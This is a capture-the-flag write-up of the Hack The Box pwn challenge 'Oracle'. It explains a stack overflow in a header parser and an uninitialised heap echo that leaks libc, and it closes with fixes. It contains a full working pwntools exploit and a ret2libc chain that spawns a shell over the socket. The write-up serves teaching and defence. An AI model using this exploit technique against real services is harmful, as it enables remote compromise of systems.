## Overview

Oracle is a Medium **Pwn** challenge: a small "competitor oracle" TCP service (glibc 2.36, PIE + NX + Partial RELRO, **no stack canary**). Two independent bugs chain into a full remote shell. A header-parsing loop with no bound smashes the saved return address; a plague-description handler echoes an uninitialised heap buffer at its *declared* length, leaking a libc pointer from the unsorted bin. With libc known, a ret2libc chain calls `dup2` to bind a shell to the very socket we are talking on — so no PIE leak is ever needed.

## The technique

The service handles one HTTP-like request per connection: a start line (`ACTION target version`), a header block terminated by `\r\n\r\n`, then an action (`VIEW` or `PLAGUE`).

**Bug 1 — [unbounded stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html) ([CWE-121](https://cwe.mitre.org/data/definitions/121.html)).** `parse_headers` reads the header block a byte at a time into a 1024-byte stack buffer, but the loop counter is never bounded to the buffer size:

```c
char header_buffer[1024];   // at rbp-0x430
ssize_t i = 0;              // at rbp-0x8   <-- inside the overflow!
while (1) {
    recv(client_socket, &byteRead, 1, 0);
    if (!(byteRead=='\n' && header_buffer[i-1]!='\r')) header_buffer[i]=byteRead;
    if (!strncmp(&header_buffer[i-3], "\r\n\r\n", 4)) break;
    i++;                    // never checked against sizeof(header_buffer)
}
```

With no canary, the saved return address at offset `0x438` is directly overwritable. Two subtleties make the write tricky: the loop counter `i` itself lives *inside* the overflow region (offset `0x428`), so as the linear write passes over it you must write the correct self-consistent value (`p64(0x428)`) to keep `i` incrementing cleanly to the return-address slot; and the newline-cleanup branch silently drops any lone `0x0a` byte not preceded by `0x0d`, which acts as a bad-character constraint on the ROP chain.

**Bug 2 — [uninitialised heap disclosure](https://cwe.mitre.org/data/definitions/908.html) ([CWE-908](https://cwe.mitre.org/data/definitions/908.html)).** The `PLAGUE` handler reads the description with `recv(buf, len)` but echoes it back with `write(fd, buf, len)` using the **declared** `Content-Length`, not the number of bytes actually received. Send fewer bytes than declared and the tail of a freshly `malloc`'d chunk is echoed back — and when that chunk was just recycled from the unsorted bin, its first 16 bytes still hold `fd`/`bk` pointers into `main_arena`, i.e. a libc leak.

## Solution

Prime an unsorted-bin chunk (a `0x800` allocation freed with a small guard allocation between it and the top chunk so it is not consolidated), then reuse it and send only 8 bytes so the chunk's `bk` at offset 8 survives to be echoed: `libc_base = leaked_bk - 0x1d2cc0` (glibc 2.36). Then overflow `parse_headers` and return into a ret2libc chain that redirects the client socket to stdin/stdout and pops a shell:

```
pop rdi; client_fd; pop rsi; 0; dup2   # stdin  <- socket
pop rdi; client_fd; pop rsi; 1; dup2   # stdout <- socket
pop rdi; &"/bin/sh"; ret; system
```

`client_fd` is the predictable per-connection `accept` fd (fresh process: `server_socket=3`, so the third connection is fd `6`). The full working exploit:

```python
#!/usr/bin/env python3
# Oracle (HTB Pwn) - unbounded stack overflow + partial-recv heap leak -> ret2libc over the socket.
import sys, time
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

HOST, PORT = sys.argv[1], int(sys.argv[2])
LEAK_OFF = 0x1d2cc0
G_RDI, G_RSI, G_RET = 0x277e5, 0x28f99, 0x27182
SYSTEM, DUP2, BINSH = 0x4c490, 0xf8990, 0x196031

def send_req(r, action, target, version, headers, body=None):
    r.send(f'{action} {target} {version}\r\n'.encode())
    r.send(b''.join(f'{k}: {v}\r\n'.encode() for k, v in headers) + b'\r\n')
    if body is not None:
        r.send(body)

def prime():                                   # free a 0x810 chunk into the unsorted bin
    r = remote(HOST, PORT)
    send_req(r, 'PLAGUE', 'Bob', 'v',
             [('Content-Length', '2047'), ('Plague-Target', 'AAAA')], body=b'A' * 2047)
    r.recvall(timeout=3); r.close()

def leak():                                    # reuse it, send 8 bytes so bk survives -> libc
    r = remote(HOST, PORT)
    send_req(r, 'PLAGUE', 'Bob', 'v', [('Content-Length', '2047')], body=b'B' * 8)
    d = r.recvall(timeout=3); r.close()
    blob = d.split(b'Attempted plague: ')[-1]
    return u64(blob[8:16]) - LEAK_OFF

def chain(base, fd):
    a = lambda o: base + o
    return b''.join(p64(x) for x in [
        a(G_RDI), fd, a(G_RSI), 0, a(DUP2),
        a(G_RDI), fd, a(G_RSI), 1, a(DUP2),
        a(G_RDI), a(BINSH), a(G_RET), a(SYSTEM)])

def overflow(base, fd):
    # header_buffer at rbp-0x430; loop counter i at offset 0x428; saved RIP at 0x438
    payload = b'A' * 0x428 + p64(0x428) + b'A' * 8 + chain(base, fd)
    r = remote(HOST, PORT)
    r.send(b'PLAGUE Bob v\r\n')
    r.send(payload + b'\r\n\r\n')
    time.sleep(0.5)
    r.sendline(b'cat flag.txt')
    time.sleep(0.6)
    print(r.recv(timeout=3).decode(errors='replace'))

prime()
base = leak()
log.success(f'libc base = {hex(base)}')
overflow(base, 6)
```

Running it against a live instance returns the flag `HTB{...}` over the shell.

## Why it worked

Neither bug is enough alone. The overflow gives control of the instruction pointer (no canary to bypass), but PIE and NX mean we need a libc address and a code-reuse chain rather than a jump to shellcode. The partial-`recv` echo supplies exactly that libc address with no separate info-leak primitive — the unsorted-bin `bk` pointer is a fixed offset from the libc base. Redirecting the client socket onto file descriptors 0 and 1 with `dup2` means `system("/bin/sh")` gives an interactive shell over the existing connection, so the exploit never needs the binary's own base or a leak of it.

## Fix / defense

Bound the header loop to `sizeof(header_buffer) - 1` (or use a length-checked reader), and compile with stack protection enabled. For the leak, always use the byte count returned by `recv()`/`read()` for downstream length arguments instead of the declared length, and zero the buffer (`calloc`) before use so stale heap contents can never be echoed back.
